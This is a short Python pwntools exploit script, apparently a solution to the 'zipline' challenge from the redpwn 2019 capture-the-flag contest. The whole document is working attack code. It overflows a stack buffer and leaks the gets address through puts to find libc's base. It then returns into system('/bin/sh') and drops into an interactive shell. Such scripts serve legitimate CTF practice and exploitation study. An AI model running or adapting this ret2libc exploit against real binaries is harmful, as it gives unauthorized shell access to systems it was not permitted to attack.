from pwn import *

#r = remote("chall2.2019.redpwn.net", 4005)
r = process("./zipline")
binary = ELF("./zipline")
libc = ELF("libc6_2.23-0ubuntu10_i386.so")
padding =  22
puts_plt = binary.symbols['plt.puts']
puts_got = binary.symbols['got.gets']
zipline = binary.symbols['zipline']

payload = ""
payload += "A" * padding
payload += p32(puts_plt)
payload += p32(zipline)
payload += p32(puts_got)
r.sendline(payload)

r.recvuntil("?\n")
gets_libc = u32(r.recv(4))

log.info("Gets Libc : 0x{0:x}".format(gets_libc))
base_libc = gets_libc - libc.symbols["gets"]
log.info("Base Libc : 0x{0:x}".format(base_libc))
system_libc = base_libc + libc.symbols["system"]
log.info("System Libc : 0x{0:x}".format(system_libc))
binsh_libc = base_libc + libc.search("/bin/sh").next()
log.info("/bin/sh Libc : 0x{0:x}".format(binsh_libc))

payload = ""
payload += "A" * padding
payload += p32(system_libc)
payload += "JUNK"
payload += p32(binsh_libc)

r.sendline(payload)
r.interactive()
